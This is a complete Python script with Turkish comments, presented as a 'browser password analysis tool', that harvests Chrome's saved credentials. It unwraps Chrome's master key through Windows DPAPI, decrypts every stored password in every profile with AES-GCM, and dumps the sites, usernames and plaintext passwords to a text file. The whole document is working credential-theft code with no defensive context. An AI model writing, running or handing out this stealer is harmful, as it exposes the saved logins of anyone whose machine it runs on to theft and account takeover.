import os
import sqlite3
import json
import base64
import shutil
import binascii
from Crypto.Cipher import AES # pip install pycryptodome
import win32crypt # pip install pypiwin32

def get_master_key():
    """Chrome'un ana deşifre anahtarını Local State dosyasından çeker."""
    path = os.path.join(os.environ['USERPROFILE'], 
                        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    if not os.path.exists(path):
        return None

    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        # Anahtarı Base64'ten çöz ve DPAPI ile deşifre et
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"[!] Master Key çözülemedi: {e}")
        return None

def decrypt_password(buff, master_key):
    """AES-GCM kullanarak şifrelenmiş blob verisini çözer."""
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Deşifre Edilemedi (Eski Versiyon veya Boş)"

def process_profile(profile_path, master_key):
    """Belirli bir profil klasöründeki şifreleri çeker."""
    login_db = os.path.join(profile_path, 'Login Data')
    if not os.path.exists(login_db):
        return []

    # Veritabanı kilitli olabileceği için geçici bir kopyasını alıyoruz
    temp_db = "temp_login_data.db"
    shutil.copyfile(login_db, temp_db)
    
    passwords = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url, user, encrypted_pass = row
            if user or encrypted_pass:
                decrypted_pass = decrypt_password(encrypted_pass, master_key)
                passwords.append({
                    'url': url,
                    'user': user,
                    'pass': decrypted_pass
                })
        conn.close()
    except Exception as e:
        print(f"[!] Veritabanı hatası: {e}")
    finally:
        os.remove(temp_db) # Geçici dosyayı temizle
    
    return passwords

def main():
    print("--- Tarayıcı Şifre Analiz Aracı ---")
    
    m_key = get_master_key()
    if not m_key:
        print("[!] Master Key bulunamadı. Chrome yüklü olmayabilir.")
        return

    base_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    
    # Tüm profilleri bul (Default, Profile 1, Profile 2...)
    profiles = [os.path.join(base_path, d) for d in os.listdir(base_path) 
                if d == 'Default' or d.startswith('Profile')]

    all_data = []
    for profile in profiles:
        print(f"[*] Profil taranıyor: {os.path.basename(profile)}")
        data = process_profile(profile, m_key)
        all_data.extend(data)

    # Sonuçları dosyaya kaydet
    if all_data:
        with open("chrome_passwords_dump.txt", "w", encoding="utf-8") as f:
            for entry in all_data:
                f.write(f"Site: {entry['url']}\nKullanıcı: {entry['user']}\nŞifre: {entry['pass']}\n")
                f.write("-" * 50 + "\n")
        print(f"\n[+] İşlem tamam! {len(all_data)} adet şifre 'chrome_passwords_dump.txt' dosyasına yazıldı.")
    else:
        print("\n[-] Kayıtlı şifre bulunamadı.")

if __name__ == "__main__":
    main()
